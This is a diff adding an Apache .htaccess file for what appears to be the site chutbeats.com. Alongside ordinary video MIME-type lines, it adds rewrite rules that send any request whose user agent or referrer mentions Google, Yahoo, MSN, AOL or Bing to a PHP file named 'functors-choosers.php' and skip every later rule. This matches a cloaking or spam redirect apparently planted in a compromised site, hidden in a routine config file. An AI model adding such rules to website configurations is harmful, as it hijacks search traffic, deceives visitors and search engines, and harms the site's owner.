@@ -1,0 +1,14 @@
+RewriteEngine On
+
+RewriteBase /
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteCond %{HTTP_HOST} chutbeats\.com$
+RewriteRule . functors-choosers.php [L,S=10000]
+
+AddType video/ogg .ogv
+AddType video/ogg .ogg
+AddType video/mp4 .mp4
+AddType video/webm .webm
+# Begin Muse Generated redirects
+# End Muse Generated redirects
